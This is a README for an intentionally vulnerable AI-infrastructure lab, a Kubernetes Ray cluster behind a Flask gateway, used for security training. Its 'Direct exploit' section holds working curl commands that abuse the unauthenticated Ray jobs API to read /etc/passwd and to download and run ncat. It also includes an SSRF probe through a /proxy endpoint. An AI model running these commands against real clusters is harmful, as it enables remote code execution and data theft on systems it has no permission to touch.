# shadowray-ai

## Provision the Kubernetes stuff

helm repo add kuberay https://ray-project.github.io/kuberay-helm/
helm repo update

helm install kuberay-operator kuberay/kuberay-operator \
  --version 1.1.0

kubectl apply -f infrastructure/ray-cluster-complete.gpu.yaml

**Important: Wait about 5 mins while the Ray server deploy all the pods**

## Deploy within the Ray Cluster

### 1. Get pod names
HEAD_POD=$(kubectl get pod -l ray.io/node-type=head -o jsonpath='{.items[0].metadata.name}')
GPU_POD=$(kubectl get pod -l ray.io/group=gpu-group -o jsonpath='{.items[0].metadata.name}')

### 2. Install libraries on GPU worker
kubectl exec $GPU_POD -- pip install transformers torch --break-system-packages

### 3. Install libraries on head
kubectl exec $HEAD_POD -- pip install transformers torch --break-system-packages

### 4. Copy sentiment analysis script to head pod and deploy the Serve sentiment service
kubectl cp inference/llm-sentiment-analysis.py $HEAD_POD:/tmp/llm-sentiment-analysis.py
kubectl exec $HEAD_POD -- python /tmp/llm-sentiment-analysis.py

#############
## Test Ray Serve isolated (direct, without flask)

### Port-forward the Ray Serve endpoint to your local machine
kubectl port-forward service/raycluster-sample-head-svc 8000:8000 -n default

### Test: Negative sentiment 
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"text": "Setting up GPU nodes was really frustrating"}'

### Test: Positive sentiment
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"text": "After 18 hours we finally got it working!"}'

### Troll tests
curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"text": "Bencer named one of his sons with my surname"}'

curl -X POST http://localhost:8000/analyze \
  -H "Content-Type: application/json" \
  -d '{"text": "Bencer named one of his sons with my surname"}'

## Expose the Ray Dashboard (to accept job submissions)
kubectl port-forward svc/raycluster-sample-head-svc 8265:8265

## Check the dashboard with the browser
http://localhost:8265

## Direct exploit via Ray job submission
### Get /etc/passwd
# Get /etc/passwd
JOB=$(curl -s -X POST http://localhost:8265/api/jobs/ -H "Content-Type: application/json" -d '{"entrypoint": "cat /etc/passwd | head -5", "runtime_env": {}}' | jq -r '.submission_id') && sleep 5 && curl -s http://localhost:8265/api/jobs/${JOB}/logs | jq -r '.logs'
# Download netcat and scan a domain
# Test connection to external domain
JOB=$(curl -s -X POST http://localhost:8265/api/jobs/ \
  -H "Content-Type: application/json" \
  -d '{
    "entrypoint": "bash -c \"wget -O /tmp/ncat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat && chmod +x /tmp/ncat && echo Testing connection to google.com:443... && timeout 3 /tmp/ncat -v google.com 443 || echo Connection test complete\"",
    "runtime_env": {}
  }' | jq -r '.submission_id') && echo "Job: $JOB" && sleep 10 && curl -s http://localhost:8265/api/jobs/${JOB}/logs | jq -r '.logs'

## Get deployment info
kubectl exec $GPU_POD -- nvidia-smi
kubectl logs $GPU_POD | grep "Loading model"

######################

# Deploy Flask

kubectl create configmap flask-api-code --from-file=inference/flask-api.py
kubectl apply -f infrastructure/flask-deployment.yaml
kubectl get pods -l app=flask-api
kubectl logs -l app=flask-api -f

# Test Flask
### 6. Test Flask → Ray connection
kubectl port-forward svc/flask-api-svc 5000:5000

## Probe the /proxy endpoint
curl -X POST http://localhost:5000/proxy-get \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://raycluster-sample-head-svc.default.svc.cluster.local:8265/api/version"
  }' | jq .

# Info


## Chain

Internet → Nginx (Misconfigured) → Flask API (Vulnerable) → Ray Cluster (Protected)
           ↓                         ↓                         ↓
        Layer 1 Bypass          Layer 2 Exploit         Layer 3 Compromise


## 3-tier vulnerable stack

┌─────────────────────────────────────────────────────────────┐
│                    ATTACKER (External)                       │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ↓
┌─────────────────────────────────────────────────────────────┐
│  LAYER 1: Nginx Reverse Proxy (Exposed to Internet)         │
│  Vulnerabilities:                                            │
│  - Misconfigured proxy_pass (allows path traversal)         │
│  - Missing rate limiting                                     │
│  - Debug endpoints exposed                                   │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ↓
┌─────────────────────────────────────────────────────────────┐
│  LAYER 2: Flask API Gateway (Internal)                      │
│  Vulnerabilities:                                            │
│  - SSRF via /proxy endpoint                                  │
│  - RCE via /debug/eval                                       │
│  - Info leak via /health                                     │
└──────────────────────────┬──────────────────────────────────┘
                           │
                           ↓
┌─────────────────────────────────────────────────────────────┐
│  LAYER 3: Ray Cluster (Should be protected but exposed)     │
│  - GPU inference service                                     │
│  - Sensitive AI workload                                     │
│  - Target of the attack                                      │
└─────────────────────────────────────────────────────────────┘

> **WARNING: INTENTIONALLY VULNERABLE - DO NOT DEPLOY TO PRODUCTION**
>
> This repository contains a **deliberately vulnerable** AI infrastructure stack
> designed for security research, training, and demonstration purposes only.
> It includes multiple critical vulnerabilities (SSRF, RCE, command injection,
> unauthenticated admin endpoints) and offensive exploitation tools.
>
> **Requirements for use:**
> - Isolated lab/test environment only (never internet-facing)
> - Explicit authorization from environment owner
> - No production data or credentials
>
> Unauthorized use of the included offensive tools against systems you do not
> own or have explicit permission to test is illegal and unethical.
